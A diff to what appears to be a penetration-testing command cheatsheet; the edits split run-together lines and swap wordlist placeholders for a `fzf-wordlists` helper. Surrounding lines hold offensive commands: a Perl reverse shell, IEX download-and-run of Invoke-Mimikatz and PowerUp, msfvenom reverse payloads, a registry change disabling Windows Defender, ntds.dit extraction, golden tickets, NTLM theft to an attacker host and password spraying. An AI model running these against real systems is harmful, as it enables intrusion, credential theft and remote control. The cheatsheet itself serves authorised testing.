@@ -260,7 +260,7 @@ cat <file1-txt> | <word-count> | cat > <file2-txt>
 cat <file1-txt> | sort > <sorted-file1-txt>
 cat <ip>
 cat <json_file> | ruby -ryaml -rjson -e 'puts YAML.dump(JSON.load(ARGF))'
-cat <wordlist> | 7za t <file>.7z
+cat `fzf-wordlists` | 7za t <file>.7z
 cat a
 cat a | sort -u 
 cat a | sort -u > b
@@ -273,7 +273,8 @@ cat customqueries.json
 cat debug.log
 cat domain_users.grep
 cat domains.txt | dnsx -silent -w jira,grafana,jenkins -d -
-cat domains.txt | httprobehttpx -probe -list hosts.txt -tech-detect -status-code -fr
+cat domains.txt | httprobe
+httpx -probe -list hosts.txt -tech-detect -status-code -fr
 cat ftp_anonymous_<port>.txt
 cat ftp_banner.txt
 cat ftp_banner.txt | grep ^FTP
@@ -514,21 +515,17 @@ coercer.py -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMa
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
-cowpatty -f wordlist.txt -r crackme.cap -s Mandela2crackhound.py --verbose --password 'exegol4thewin' --plain-text --plain-text --domain "$DOMAIN" --file ownedusers.txt --add-password
+cowpatty -f wordlist.txt -r crackme.cap -s Mandela2
+crackhound.py --verbose --password 'exegol4thewin' --plain-text --plain-text --domain "$DOMAIN" --file ownedusers.txt --add-password
 cp -a <old-folder>/ <new-folder>
 cp <filename> <file-copyname>
 cp <filename>.zip /media/Downloads
 cp bloodhound-customqueries-downloader /opt
 cp customqueries.json ~/.config/bloodhound/
-cp ips_all_alive.txt /media/Downloads
-cp nuclei.txt nuclei_bak.txt
-cp Rapport_nmap_* /media/Downloads
-cp whatweb_bassic_auth.txt whatweb_basic_auth_selection.txt
-cqt testssl.txt
-creds_all
 crontab -e
 crontab -l
-crunch 4 7 abcdefghijklmnopqrstuvwxyz1234567890 -o wordlist.txtctf-party $STRING to_hex
+crunch 4 7 abcdefghijklmnopqrstuvwxyz1234567890 -o wordlist.txt
+ctf-party $STRING to_hex
 crunch 8 8 -t <pattern|,@@@%%%^> -o <output.txt>
 crunch 8 8 -t password%%^ -o <output.txt>
 crunch <min> <max> -f /usr/share/crunch/charset.lst <charset|mixalpha-numeric> -o <output.txt>
@@ -605,7 +602,7 @@ dnsenum <domain>
 dnsrecon
 dnsrecon -a -d "target.domain"
 dnsrecon -d "target.domain"
-dnsrecon -d <domain> -D <wordlist> -t brt
+dnsrecon -d <domain> -D `fzf-wordlists` -t brt
 dnsrecon -d <domain> -t axfr
 dnsrecon -n <ip> -a
 dnsrecon -n <ip> -r 127.0.0.1/24
@@ -760,14 +757,14 @@ Extract old passwords
 ExtractBitlockerKeys.py -dc-ip $DC_IP -Username $USERNAME -Password $PASSWORD -ExportToCSV ./keys.csv -ExportToJSON ./keys.jsonEyeWitness.py -f urls.txt --web
 extractor.sh ./git-repo/ ./clean-git-repo/
 faketime '2022-01-31 22:05:35' zsh
-fcrackzip -u -D -p <wordlist> <file>.zip
+fcrackzip -u -D -p `fzf-wordlists` <file>.zip
 fcrackzip -u -v -D -p `fzf-wordlists` file.zip
 fdisk -l
 fdisk image.dd
 feh .
 feroxbuster --url <url>
-feroxbuster --url <url> -w <wordlist>
-feroxbuster -H "User-Agent: PENTEST" -w "/path/to/wordlist.txt" -u http://192.168.10.10/
+feroxbuster --url <url> -w `fzf-wordlists`
+feroxbuster -H "User-Agent: PENTEST" -w `fzf-wordlists` -u http://192.168.10.10/
 feroxbuster -H "User-Agent: PENTEST" -w `fzf-wordlists` -u http://192.168.10.10/
 feroxbuster -u <proto|https>://[<ipv6>] --no-recursion -vv
 feroxbuster -u <url> --auto-bail
@@ -782,11 +779,11 @@ ffuf -c -w `fzf-wordlists` -e .php,.txt,.pl,.sh,.asp,.aspx,.html,.json,.py,.cfm,
 ffuf -c -w `fzf-wordlists` -u "http://$TARGET/FUZZ"fierce --domain "$DOMAIN" --dns-servers "$TARGET"
 ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.machine.org' -u "http://$TARGET/"
 ffuf -fs 185 -c -w `fzf-wordlists` -H 'Host: FUZZ.org' -u "http://$TARGET/"
-ffuf -H "Host: FUZZ.$DOMAIN" -H "User-Agent: PENTEST" -c -w "/path/to/wordlist.txt" -u $URL
-ffuf -w <wordlist> -u <url> -H "Host: FUZZ" -fs <response_size>
-ffuf -w <wordlist> -u <url> -X POST -d "username=admin\&password=FUZZ" -fc 401
-ffuf -w <wordlist> -u <url>/FUZZ
-ffuf -w <wordlist> -u <url>?<param>=FUZZ -fs <response_size>
+ffuf -H "Host: FUZZ.$DOMAIN" -H "User-Agent: PENTEST" -c -w `fzf-wordlists` -u $URL
+ffuf -w `fzf-wordlists` -u <url> -H "Host: FUZZ" -fs <response_size>
+ffuf -w `fzf-wordlists` -u <url> -X POST -d "username=admin\&password=FUZZ" -fc 401
+ffuf -w `fzf-wordlists` -u <url>/FUZZ
+ffuf -w `fzf-wordlists` -u <url>?<param>=FUZZ -fs <response_size>
 fg
 finalrecon.py --crawl $TARGET
 finalrecon.py --full $TARGETfindomain -t $TARGET
@@ -974,7 +971,9 @@ GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7
 GetUserSPNs.py -outputfile Kerberoastables.txt -no-preauth "$USER" -usersfile "services.txt" -dc-host "$DC_IP" "$DOMAIN"/
 GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
 GetUserSPNs.py <domain>/<username>:<password> -outputfile <outfile>
-gf -save php-serialized -HnrE '(a:[0-9]+:{|O:[0-9]+:"|s:[0-9]+:")'ghidragit-dumper $TARGET/.git ./git-dump/github-email ghusername
+gf -save php-serialized -HnrE '(a:[0-9]+:{|O:[0-9]+:"|s:[0-9]+:")'
+ghidra
+git-dumper $TARGET/.git ./git-dump/github-email ghusername
 git add -A
 git add <changed_files>;
 git checkout -b <new_branch_name>
@@ -1016,16 +1015,16 @@ gitdumper.sh $TARGET/.git ./git-dump/
 gitfinder.py -i urls.txt
 gMSADumper.py -d "$DOMAIN" -l "$DC_HOST" -u "$USER" -p "$PASSWORD"
 gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
-gobuster dir --useragent "PENTEST" --wordlist "/path/to/wordlist.txt" --url $URL
-gobuster dir -u <url> -w <wordlist>
-gobuster dir -u <url> -w <wordlist> -t 30
-gobuster dir -u <url> -w <wordlist> -x json,html,php,txt
-gobuster dir -u <url> -w <wordlist> -x json,html,php,txt,xml,md
+gobuster dir --useragent "PENTEST" --wordlist `fzf-wordlists` --url $URL
+gobuster dir -u <url> -w `fzf-wordlists`
+gobuster dir -u <url> -w `fzf-wordlists` -t 30
+gobuster dir -u <url> -w `fzf-wordlists` -x json,html,php,txt
+gobuster dir -u <url> -w `fzf-wordlists` -x json,html,php,txt,xml,md
 gobuster dir -w `fzf-wordlists` -t 20 -x php,txt,pl,sh,asp,aspx,html,json,py,cfm,rb,cgi,bak,tar.gz,tgz,zip -u "http://$TARGET/"
 gobuster dir -w `fzf-wordlists` -u http://192.168.56.0:8000/
 gobuster dns --domain "target.domain" --resolver "nameserver" --wordlist "/path/to/wordlist" 
 gobuster dns -d <ip> -t 25 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
-gobuster vhost --useragent "PENTEST" --wordlist "/path/to/wordlist.txt" --url $URL
+gobuster vhost --useragent "PENTEST" --wordlist `fzf-wordlists` --url $URL
 goldencopy --password 'exegol4thewin' --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 'SRV1$'
 goldencopy --tools all --password 'exegol4thewin' --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 'john'
 GoldenGMSA.exe kdsinfo
@@ -1168,31 +1167,27 @@ hashcat --hash-type 18200 --attack-mode 0 ASREProastables.txt `fzf-wordlists`
 hashcat --hash-type 2100 --attack-mode 0 '$DCC2$10240#user#bb38628253e7681553b72e7da3adf305' `fzf-wordlists`
 hashcat --hash-type 22000 --attack-mode 0 dump_WPA-PBKDF2-PMKID_EAPOL.hashcat `fzf-wordlists`
 hashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file
-hashcat -a 0 -m 400 hashes <wordlist>
-hashcat -a 0 -m 400 hashes <wordlist> -r /usr/share/doc/hashcat/rules/best64.rule 
-hashcat -m 1000 -a 0 hashes <wordlist> 
+hashcat -a 0 -m 400 hashes `fzf-wordlists`
+hashcat -a 0 -m 400 hashes `fzf-wordlists` -r /usr/share/doc/hashcat/rules/best64.rule 
+hashcat -m 1000 -a 0 hashes `fzf-wordlists` 
 hashcat -m 1000 -a0 -1 ?l?d <hashes> ?1?1?1?1?1?d?d!
-hashcat -m 13100 --force -a 0 hashes <wordlist> 
-hashcat -m 13100 --force <hashes> <wordlist> # kerberoast
+hashcat -m 13100 --force -a 0 hashes `fzf-wordlists` 
+hashcat -m 13100 --force <hashes> `fzf-wordlists` # kerberoast
 hashcat -m 13100 kerberoastables.txt $wordlist
-hashcat -m 18200 -a 0 <hashes> <wordlist> # asreproast
+hashcat -m 18200 -a 0 <hashes> `fzf-wordlists` # asreproast
 hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
-hashcat -m 3000 -a 0 hashes <wordlist> 
-hashcat -m 5500 -a 0 hashes <wordlist> 
+hashcat -m 3000 -a 0 hashes `fzf-wordlists` 
+hashcat -m 5500 -a 0 hashes `fzf-wordlists` 
 hashcat -m 5600 --force -a 1 hashes <custom_wordlist> <custom_wordlist>
-hashcat -m 5600 -a 0 hashes <wordlist> 
+hashcat -m 5600 -a 0 hashes `fzf-wordlists` 
 Hashcat format  -m 13100
 Hashcat format  -m 18200 
 hcxdumptool -i <wlanmon_interface> -o capture.pcapng --enable_status=1 -c <channel>
-hcxdumptool -i wlan1 -o dump.pcapng --active_beacon --enable_status=1hcxpcapngtool -o dump.hashcat dump.pcapng
+hcxdumptool -i wlan1 -o dump.pcapng --active_beacon --enable_status=1
+hcxpcapngtool -o dump.hashcat dump.pcapng
 hcxhashtool -i dump.hashcat --info stdout
 hcxpcapngtool --all -o dump.hashcat dump.pcapng
 hcxpcaptool -z test.16800 test.pcapng
-head -n 166 nmap_udp.gnmap
-head -n 66 nmap_udp.gnmap
-head nmap_udp.gnmap
-head nmap_udp.nmap
-head ping_sweep.gnmap
 hexedit image.png
 host $hostname
 host $IP_address
@@ -1201,37 +1196,13 @@ host -t ns <domain>
 hostapd-wpe <hostapd_conf>
 hostname
 hping3 $TARGEThttpmethods.py --threads 40 --location "http://$TARGET/"
-https://github.com/BloodHoundAD/BloodHound
-https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
-https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/PrintSpoofer.NET
-https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
-https://github.com/cube0x0/CVE-2021-1675
-https://github.com/dafthack/HostRecon
-https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
-https://github.com/fox-it/aclpwn.py
-https://github.com/fox-it/BloodHound.py
-https://github.com/frohoff/ysoserial
-https://github.com/Hackndo/WebclientServiceScanner
-https://github.com/itm4n/PrivescCheck
-https://github.com/leoloobeek/LAPSToolkit
-https://github.com/Mr-Un1k0d3r/SCShell
-https://github.com/nidem/kerberoast
-https://github.com/NotMedic/NetNTLMtoSilverTicket
-https://github.com/PowerShellMafia/PowerSploit/
-https://github.com/seajaysec/cypheroth
-https://github.com/topotam/PetitPotam
-https://mpgn.gitbook.io/crackmapexec/
-https://neo4j.com/docs/
 httpx-toolkit
 httpx-toolkit --help
-httpx-toolkit -rl 100 -t 30 -follow-redirects -maxr 3 -l ../ips_all_alive.txt -p 10001,10601,1311,222,2301,2381,3128,40005,6002,7002,8008,9004 
-httpx-toolkit -rl 100 -t 30 -follow-redirects -maxr 3 -l a -p 1311
-httpx-toolkit -rl 100 -t 30 -follow-redirects -maxr 3 -l b -p 1311
+httpx-toolkit -rl 100 -t 30 -follow-redirects -maxr 3 -l ips.txt -p 1311
 httpx-toolkit -rl 100 -t 30 -follow-redirects -maxr 3 -l ips_all_alive.txt -p 80,443,3000,5000,7070,8000,8080,8443,8081,8082,8088,8888,9000,9090
 httpx-toolkit -rl 100 -t 30 -follow-redirects -maxr 3 -l ips_all_alive.txt -p 80,443,3000,5000,7070,8000,8080,8443,8081,8082,8088,8888,9000,9090,7002 -o httpx.txt
 httpx-toolkit -s -rl 100 -t 30 -follow-redirects -maxr 3 -l ips_all_alive.txt -p 10001,10601,1311,222,2301,2381,3128,40005,6002,7002,8008,9004 
 hydra --help
-hydra -h
 hydra -l $USER -P passwords.txt -s $PORT -f $TARGET http-get /admin
 hydra -l <user> -s 22 -P <path_pass_list> <IP> -t 4 ssh
 hydra -L <userlist> -P <passlist> <ip> ftp 
@@ -1256,7 +1227,6 @@ icacls <filename> /grant <username>(OI)(CI)F /T
 iconv -f ASCII -t UTF-16LE <file_to_convert> | base64 | tr -d "\n"
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
 IEX(New-Object Net.WebClient).downloadString('<url>/PowerUp.ps1') ;Invoke-AllChecks
-If the server is launch with --reverse you can specify R: socks to get a proxy socks on server machine (port 1080)
 impacket-getTGT -h
 impacket-getTGT -ts -dc-ip <ip> <ip>/administrateur
 impacket-GetUserSPNs -dc-ip <ip> -ts <ip>/<user> -target-domain <ip> <ip>
@@ -1289,7 +1259,6 @@ Import-Module .\LAPSToolkit.ps1; Find-LAPSDelegatedGroups
 Import-Module .\LAPSToolkit.ps1; Get-LAPSComputers
 import-module sharphound.ps1
 infoga.py -d "$DOMAIN" -s all -b -r "$DOMAIN.txt" -v 2
-Invoke mimikatz
 invoke-bloodhound -collectionmethod all -domain <domain>
 Invoke-Command -ComputerName <computername> -FilePath <path_to_script> -credential <domain>\<username>
 Invoke-Command -computername <computername> -ScriptBlock {<cmd>} -credential <domain>\<username>
@@ -1308,7 +1277,6 @@ ip a
 ip link set ligolo up
 ip route add 192.168.0.0/24 dev ligololinkedin2username.py -u myname@email.com -c uber-com
 ip tuntap add user root mode tun ligolo
-ipconfig /all
 ipconfig /all #Info about interfaces
 ipconfig /displaydns | findstr "Record" | findstr "Name Host"
 ipinfo 1.1.1.1
@@ -1319,15 +1287,17 @@ jadx-gui ./source/
 jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore my_release_key.keystore name.apk alias_name
 java -jar uber-apk-signer-1.1.0.jar -a <app>
 java -jar ysoserial.jar <lib_payload> 'powershell.exe -EncodedCommand <base64_encoded_command>' > <output_file>
-jd-guijdwp-shellifier.py -t $TARGET -p $PORT --cmd "id"john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --fork=10 HashToPwn.txt --rules=all
+jd-gui
+jdwp-shellifier.py -t $TARGET -p $PORT --cmd "id"
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --fork=10 HashToPwn.txt --rules=all
 john --format=krb5tgs --wordlist=$wordlist kerberoastables.txt
 john --format=krb5tgs --wordlist=`fzf-wordlists` Kerberoastables.txt
 john --wordlist=$wordlist ASREProastables.txt
-john --wordlist=<wordlist> --format=lm hash.txt
-john --wordlist=<wordlist> --format=netntlm hash.txt
-john --wordlist=<wordlist> --format=netntlmv2 hash.txt
-john --wordlist=<wordlist> --format=nt hash.txt
-john --wordlist=<wordlist> <ssh_hash|sshkey.hash>
+john --wordlist=`fzf-wordlists` --format=lm hash.txt
+john --wordlist=`fzf-wordlists` --format=netntlm hash.txt
+john --wordlist=`fzf-wordlists` --format=netntlmv2 hash.txt
+john --wordlist=`fzf-wordlists` --format=nt hash.txt
+john --wordlist=`fzf-wordlists` <ssh_hash|sshkey.hash>
 john --wordlist=`fzf-wordlists` ASREProastables.txt
 john 7zhash.john
 john crackme_DCC2.txt
@@ -1353,14 +1323,15 @@ joomscan -u $TARGET --enumerate-components
 joomscan -u $TARGET --proxy http://127.0.0.1:8080jwt_tool.py $JWT
 kadimus --cookie 'PHPSESSID=qsh5s21mo54qds7v5384f1q34' -u "http://$TARGET/?page=file1.php"
 kadimus -u "http://$TARGET/?page=file1.php"
-keepass2john <file>.kdbx > out.kbdx.hashes && john --wordlist <wordlist> out.kbdx.hashes
-KeePwn plugin add -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET --plugin KeeFarceRebornPlugin.dllkerbrute userenum -d "$DOMAIN" usernames.txt
+keepass2john <file>.kdbx > out.kbdx.hashes && john --wordlist `fzf-wordlists` out.kbdx.hashes
+KeePwn plugin add -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET --plugin KeeFarceRebornPlugin.dll
+kerbrute userenum -d "$DOMAIN" usernames.txt
 KeePwn plugin check -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET
 kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
 kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
 kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
 kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
-kerbrute bruteuser -d "$DOMAIN" passwords.lst thoffmankr brute https://target.com/subapp/ -A=aspx-210328:20000 -x 20 -j 1
+kerbrute bruteuser -d "$DOMAIN" passwords.lst thoffman
 kerbrute passwordspray -d "$DOMAIN" domain_users.txt Password123
 kerbrute passwordspray -d domain.local --dc dcip users.txt <password to spray>
 kerbrute userenum -d <domain> <userlist> --dc <>
@@ -1415,7 +1386,8 @@ kubectl get services -n <namespace>
 kubectl logs -f pods/<name> -n <namespace>
 kubectl top <type>
 kubectl uncordon <name>
-kubectlldapdomaindump --user "$DOMAIN"\\"$USER" --password "$PASSWORD" --outdir ldapdomaindump "$DC_HOST"
+kubectl
+ldapdomaindump --user "$DOMAIN"\\"$USER" --password "$PASSWORD" --outdir ldapdomaindump "$DC_HOST"
 laZagne browsers
 lazagne.exe all
 ldapdomaindump
@@ -1484,7 +1456,8 @@ lsassy -v -u <user> -H <hash> <ip>
 maigret "username"
 mailfy -n $USER
 make
-maltegomanspider.py --threads 50 192.168.56.0/24 -d "$DOMAIN" -u "$USER" -H "$NT_HASH" --content administrateur
+maltego
+manspider.py --threads 50 192.168.56.0/24 -d "$DOMAIN" -u "$USER" -H "$NT_HASH" --content administrateur
 man 7z
 man arp-scan
 man bloodhound 
@@ -1492,7 +1465,8 @@ man dnsrecon
 man hydra
 man ncrack
 manspider.py --threads 50 $IP_RANGE/$MASK -d $DOMAIN -u $USER -p $PASSWORD --content "set sqlplus" "password ="
-masky -d $DOMAIN -u $USER -dc-ip $DC_HOST -t 5 -o results.txt -ca "srv-01\srv-01-CA"masscan -v -p 1-65535 --rate=10000 -e "$INTERFACE" 192.168.56.0/24
+masky -d $DOMAIN -u $USER -dc-ip $DC_HOST -t 5 -o results.txt -ca "srv-01\srv-01-CA"
+masscan -v -p 1-65535 --rate=10000 -e "$INTERFACE" 192.168.56.0/24
 masscan -p 1-65535 <ip> -e <dev> --rate=1000
 masscan -v -p 1-65535,U:1-65535 --rate=10000 -e "$INTERFACE" 192.168.56.0/24
 md5sum <filename-txt>
@@ -1502,7 +1476,8 @@ memccp --servers=<ip> <localfile> # (file saved in key)
 memcdump --servers=<ip>
 memcstat --servers=<ip>
 mfcuk -C -R 0:A -v 2mfdread.py original.dmp
-mfoc -O magic-gen1.dmpminicom -smitm6 --interface "$INTERFACE"
+mfoc -O magic-gen1.dmpminicom -s
+mitm6 --interface "$INTERFACE"
 mfoc -O original.dmp
 mfoc -O original.dmp -k keys.txt
 migrate -N <process_name|notepad.exe>
@@ -1524,29 +1499,6 @@ mitm6 -hw <host> -d <domain> --ignore-nofqdn
 mitm6 -i eth0 -d domain.local
 mkcd 
 mkcd <filename>
-mkcd Bloodhound
-mkcd Ferox
-mkcd IDCD
-mkcd LDAP
-mkcd MSSQL
-mkcd No_mac
-mkcd Postgre
-mkcd SMB
-mkcd SNMP
-mkcd SysinternalsSuite
-mkcd Telnet
-mkcd TLS
-mkdir -p /media/Downloads
-mkdir 10
-mkdir <dirname>
-mkdir bin
-mkdir DonPAPI
-mkdir Fero
-mkdir FTP
-mkdir Gowitness
-mkdir HTTP
-mkdir nxc_spider_plus
-mkdir SSH
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 mobsf 0.0.0.0:8000
 moodlescan.py -r -u "http://$TARGET/"
@@ -1612,17 +1564,20 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfstaged.exe
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfnonstaged.exe
 msprobe adfs $DOMAIN
-msprobe full $DOMAINMurMurHash.py https://www.paypalobjects.com/webstatic/icon/pp32.pngnaabu -host $TARGETnth --text 5f4dcc3b5aa765d61d8327deb882cf99
+msprobe full $DOMAIN
+MurMurHash.py https://www.paypalobjects.com/webstatic/icon/pp32.png
+naabu -host $TARGET
 msprobe rdp $DOMAIN
 multirelay -t <ip> -u <user1> <user2>
 multirelay -t <ip> -u ALL
 mv -i <current-filename> <new-filename>
 mv <current-filename-path> <new-filename-path>
-mysql -u <user> -p -e "create database <database> character set UTF8mb4 collate utf8mb4_bin"
+mysql -u <user> -p -e "show tables;"
 mysql -u <user> -p <database> <path>
 mysql -u <user> -p<password> -h <hostname> <database>
 mysqldump -u <user> -p <database> > <path>
-nasm -felf64 -o <object> <filename>nbtscan -r 192.168.56.0/24
+nasm -felf64 -o <object> <filename>
+nbtscan -r 192.168.56.0/24
 nbtscan -r $RANGE
 nbtscan -r <ip_range>
 nc -nlvp <lport>
@@ -1898,11 +1853,11 @@ netview.py <domain>/<user> -target <ip> -users <users_file>
 New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD
 New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
 New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
-Next use the socks with proxychains : 
 nfc-list
 nfc-mfclassic W A B original.dmp magic-gen1.dmplibnfc_crypto1_crack a0a1a2a3a4a5 0 A 4 B
 ngrok authtoken AUTHTOKEN:::https://dashboard.ngrok.com/get-started/your-authtoken
-ngrok config add-authtoken https://dashboard.ngrok.com/get-started/your-authtokennmap --script 'smb-enum*' --script-args unsafe=1 -T5 "$TARGET"
+ngrok config add-authtoken https://dashboard.ngrok.com/get-started/your-authtoke
+nnmap --script 'smb-enum*' --script-args unsafe=1 -T5 "$TARGET"
 nikto -C all -h <url>
 nltest /dclist:<domain>
 nltest /dclist:<DOMAIN> #List domain controllers
@@ -2039,7 +1994,8 @@ ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
 ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
 ntlm_theft.py --generate all --server $ATTACKER_IP --filename "@FILENAME"
-ntlm_theft.py --verbose --generate modern --server "$ATTACKER_IP" --filename "meetingXYZ"ntlmv1-multi.py --ntlmv1 SV01$::DOMAIN.LOCAL:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
+ntlm_theft.py --verbose --generate modern --server "$ATTACKER_IP" --filename "meetingXYZ"
+ntlmv1-multi.py --ntlmv1 SV01$::DOMAIN.LOCAL:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
 ntlmrelayx -t "http://pki.$DOMAIN/certsrv/certfnsh.asp" --adcs
 ntlmrelayx -t "ldap://domaincontroller" --dump-adcs --dump-laps --dump-gmsa
 ntlmrelayx -t $target --http-port 3128
@@ -2077,7 +2033,8 @@ nvm install <version>
 nvm ls-remote
 nvm use <version>
 nxcdb
-oabextract data.oab data.txtnfc-scan-device -v
+oabextract data.oab data.txt
+nfc-scan-device -v
 oaburl.py "$DOMAIN"/"$USER":"$PASSWORD"@"mx.example.com" -e "existent.email@example.com"
 objection --gadget asvid.github.io.fridaapp explore
 objection explore
@@ -2124,16 +2081,16 @@ openssl x509 -noout -modulus -in <INPUT_CRT> | openssl md5
 openssl x509 -outform der -in <INPUT_PEM> -out <OUTPUT_CRT>
 openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
 openssl x509 -x509toreq -out <OUTPUT_CSR> -in <INPUT_CRT> -signkey <INPUT_KEY>
-others encoder : x64/zutto_dekiru
 owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'
-passthecert.py -action add_computer -crt user.crt -key user.key -domain $DOMAIN -dc-ip $DC_HOSTpatator.py ftp_login host=$TARGET user=FILE0 0=logins.txt password=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
+passthecert.py -action add_computer -crt user.crt -key user.key -domain $DOMAIN -dc-ip $DC_HOST
+patator.py ftp_login host=$TARGET user=FILE0 0=logins.txt password=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
 passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
 patator
 Pcredz -d "/path/to/pcaps/"
 Pcredz -f "file-to-parse.pcap"
 PCredz -f capture.pcappdfcrack -f confidential.pdfpeepdf.py -i file.pdf
 Pcredz -i $INTERFACE -v
-pdfcrack <file>.pdf -w <wordlist>
+pdfcrack <file>.pdf -w `fzf-wordlists`
 perl -e 'use Socket;$i="<lhost>";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
 petitpotam.py "$ATTACKER_IP" "$DC_HOST"
@@ -2269,7 +2226,7 @@ python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $
 python3 -m http.server
 python3 -m http.server <lport>
 python3 -m smtpd -n -c DebuggingServer 127.0.0.1:25
-python3 <path_to_john>/run/office2john.py <file>.xls > out.hash && john --wordlist <wordlist> out.hash
+python3 <path_to_john>/run/office2john.py <file>.xls > out.hash && john --wordlist `fzf-wordlists` out.hash
 python3 bloodhound.py
 python3 bloodhound.py --help
 python3 IOXIDResolver.py -t apt.htb
@@ -2370,7 +2327,8 @@ rm -rf <dirname>
 rm <filename-txt>
 rm pwn.c
 rmdir <dirname>
-roastinthemiddle -i eth0 -t $TARGET -u users.txt -g 192.168.187.1robotstester -u http://www.example.com/ -L
+roastinthemiddle -i eth0 -t $TARGET -u users.txt -g 192.168.187.1
+robotstester -u http://www.example.com/ -L
 ROPgadget --binary <binary>
 ROPgadget --binary <binary> --filter="<instructions>"
 ROPgadget --binary <binary> --only="<instructions>"
@@ -2424,7 +2382,8 @@ RsaCtfTool.py --publickey $PUBLIC_KEY --ecmdigits 25 --verbose --private
 RsaCtfTool.py --publickey $PUBLIC_KEY --private
 rtl_433 -f 868M -s 1024k
 rtl_433 -M hires -M level
-rtl_433 -R 1 -R 8 -R 43ruler -k -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -e "j.doe@example.com" --verbose abk dump -o emails.txt
+rtl_433 -R 1 -R 8 -R 43
+ruler -k -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -e "j.doe@example.com" --verbose
 Rubeus createnetonly /program:c:\windows\system32\cmd.exe
 Rubeus kerberoast /format:hashcat
 Rubeus ptt /luid:<luid> /ticket:<ticket>
@@ -2555,7 +2514,6 @@ sed -i s/<original-text>/<new-text>/g <filename-txt>
 sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
 sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell
 sekurlsa::tickets /export
-Send a local file to the remote target
 service --status-all
 service <service_name> restart
 service <service_name> start
@@ -2604,7 +2562,9 @@ sleep 1200
 sleep 5600
 sleep 6600 
 sleep 9600 
